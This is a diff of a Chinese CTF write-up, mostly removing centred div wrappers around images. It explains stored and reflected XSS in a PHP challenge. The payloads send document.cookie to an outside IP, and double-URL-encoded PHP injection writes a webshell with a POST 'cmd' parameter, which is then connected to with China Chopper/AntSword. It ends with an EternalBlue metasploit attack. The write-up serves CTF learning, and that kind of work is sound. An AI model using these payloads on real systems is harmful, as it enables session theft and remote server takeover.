@@ -4,48 +4,48 @@
 有全部的源码。
 先来看`admin/view.php`，这里可以了解到我们进不去的admin用户在做什么
 
-<div align=center>
+
 ![wp6.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorly5xb6j30b502edfs.jpg)
-</div>
+
 
 这个页面是会3秒刷新一次，形成不断查看用户提交信息的行为。
 之后会从数据库中原原本本读出用户提交的东西，显示在`<div>`标签内
 截取一个在服务端形成的页面帮助理解标签构造(自己在本地也可以通过源码自己架构网站来实现查看)
 
-<div align=center>
+
 ![wp7.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorn8iil5j30gx04ejr9.jpg)
-</div>
+
 
 可见这个地方是可以闭合标签形成XSS的，在`contact.php`中向admin用户发送payload
-<div align=center>
-![wp8.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqornu65xxj30p30a5753.jpg)
-</div>
 
-<div align=center>
+![wp8.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqornu65xxj30p30a5753.jpg)
+
+
+
 ![wp9.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqoro4akhgj30qe03iq2r.jpg)
-</div>
+
 
 尝试得到XSS
-payload:`</div> <script>window.location.href='http://45.63.17.127:12345/cookie.asp?msg='+document.cookie</script> <div class="panel-body">`
+payload:` <script>window.location.href='http://45.63.17.127:12345/cookie.asp?msg='+document.cookie</script> <div class="panel-body">`
 
-<div align=center>
+
 ![wp10.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorofz8caj30ig058jrp.jpg)
-</div>
+
 
 失败
 因为这里服务端**PHP.INI**设置了`session.cookie_httponly=On`
 如果没有设置的情况
 换一个payload如下(两个payload效果是一样的)：
 ```
-</div> <script>var img = document.createElement('img');
+ <script>var img = document.createElement('img');
 img.width = 0;
 img.height = 0;
 img.src = 'http://45.63.17.127:12345/a.php?joke='+document.cookie;</script> <div class="panel-body">
 ```
 
-<div align=center>
+
 ![wp11.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqorov86w6j30if05mq3d.jpg)
-</div>
+
 
 至此我们可以发现提交意见框存在XSS漏洞，也就是我们可以在admin用户的网页内执行任意前端代码，包括让admin用户去访问我们制定的网站，除了无法获得用户的cookie。
 
@@ -55,9 +55,9 @@ img.src = 'http://45.63.17.127:12345/a.php?joke='+document.cookie;</script> <div
 继续搜寻其他漏洞
 查看`index.php`源码，发现其他所有js/css都是用静态位置表示对应css,js位置
 
-<div align=center>
+
 ![wp1.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorphwnzbj30ii03lmxh.jpg)
-</div>
+
 
 只有这个地方使用`$_SERVER['SCRIPT_NAME']`来获取当前网站位置
 
@@ -65,9 +65,9 @@ img.src = 'http://45.63.17.127:12345/a.php?joke='+document.cookie;</script> <div
 
 进行测试
 
-<div align=center>
+
 ![wp2.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorpo4b79j30ga09j3ym.jpg)
-</div>
+
 
 发现成功对返回的页面进行修改，尝试是否可以进一步利用。
 payload:`"> </a> 1 <a  href="`
@@ -76,43 +76,43 @@ payload:`"> </a> 1 <a  href="`
 <a href="//index.php "> </a> 1 <a  href="" class="btn btn-lg btn-default">Current Page</a>
 ```
 
-<div align=center>
+
 ![wp3.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorq32nyrj30ko05iglp.jpg)
-</div>
+
 
 payload:`"> </a> <script>alert(1)</script> <a  href= /`
 
-<div align=center>
+
 ![wp4.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorqf44xyj30kz09x0td.jpg)
-</div>
+
 
 可以发现，形成**反弹XSS**
 由于我们之前已经从`contact.php`得到了XSS，转而找其他的思路——**嵌入后端代码**
 
-<div align=center>
+
 ![wp16.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqorqpj4ssj30wi03vdgk.jpg)
-</div>
+
 
 我们可以看见嵌入php代码是成功的，但是它只会返回到页面上，不会再后端执行。
 
 此处必须说明关于 **$_SERVER['SCRIPT_NAME']** 的另一个要点：**只接受URL编码的值**
 在该函数提取的URL中如果有特殊符号没有被URL加密过，就会直接舍弃全部
 
-<div align=center>
+
 ![wp12.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrb3y58j30uz0750tn.jpg)
-</div>
 
-<div align=center>
+
+
 ![wp13.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorreey1yj30rp06gaat.jpg)
-</div>
 
-<div align=center>
+
+
 ![wp14.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorrhdembj30vj07awfc.jpg)
-</div>
 
-<div align=center>
+
+
 ![wp15.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrkmyc0j30uv07tjs8.jpg)
-</div>
+
 
 还不接受burpsuite的+代替空格的URL编码
 
@@ -180,9 +180,9 @@ $_SERVER['SCPIPT_NAME'] 需要保证URL编码1次
 >`7%252a%2527%2529%2529%253B%253F%253E%2522%2529%253B%253F%253E3%2520/>`（此处为了显示，有换行）
 
 
-<div align=center>
+
 ![wp17.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorrtn1j5j30qx02xgln.jpg)
-</div>
+
 
 成功，但是没有发现，既然可以写入文件，就写入web-shell吧
 ### 关于webshell-payload的细节分析
@@ -211,26 +211,26 @@ fwrite函数写入内容，外单引号，内双引号
 >`%255B%2522cmd%2522%255D%2529%253B%253F%253E%2527%2529%253B%253F%253E3%2520/>`（此处为了显示，有换行）
 
 
-<div align=center>
+
 ![wp18.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqortix4e5j30pn091t98.jpg)
-</div>
+
 
 接入菜刀/蚁剑，密码为shell中post参数
 
-<div align=center>
-![wp19.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqosh707b2j30cl09pmxc.jpg)
-</div>
 
-<div align=center>
+![wp19.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqosh707b2j30cl09pmxc.jpg)
+
+
+
 ![wp20.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqoslgjlsaj30al02swef.jpg)
-</div>
+
 
 ### view.php的XSS攻击 为何与 include无法结合
 也可能会有人思考到，view页面有XSS，向view页面写入php代码，在让admin用户去包含view页面这样。
 如下payload
 
 
->`</div> <?php fwrite(fopen('test.php','w+'),'123');?> <div class="panel-body"> <img src=http://10.21.13.225/admin/index.php?path=admin/index.php?path=view/>`
+>` <?php fwrite(fopen('test.php','w+'),'123');?> <div class="panel-body"> <img src=http://10.21.13.225/admin/index.php?path=admin/index.php?path=view/>`
 
 事实是 不可以的。
 admin用户去访问`/admin/index.php`会让服务器去访问`/admin/index.php?path=view`
@@ -246,22 +246,22 @@ include 远程文件 是不能包含cookie的
 ### 发现
 使用nmap扫描发现开了443端口，为windows服务器，还开了明显被永恒之蓝入侵的端口：
 
-<div align=center>
+
 ![](http://ww4.sinaimg.cn/large/006iKNp3gy1fr57hg3d27j30w00bswg6.jpg)
-</div>
+
 
 ### 攻击
 使用metasploit扫描果然存在漏洞：
 
-<div align=center>
+
 ![](http://ww1.sinaimg.cn/large/006iKNp3gy1fr57huj9wij314f084q2y.jpg)
-</div>
+
 
 直接攻击得到shell
 
-<div align=center>
+
 ![](http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg)
-</div>
+
 
 ## 后言
 太特喵的累了....把能想到的问题一一尝试，全部解决了....也算是把白猪老哥的题弄清楚了....花了好长好长时间呜呜,溜了溜了qaq
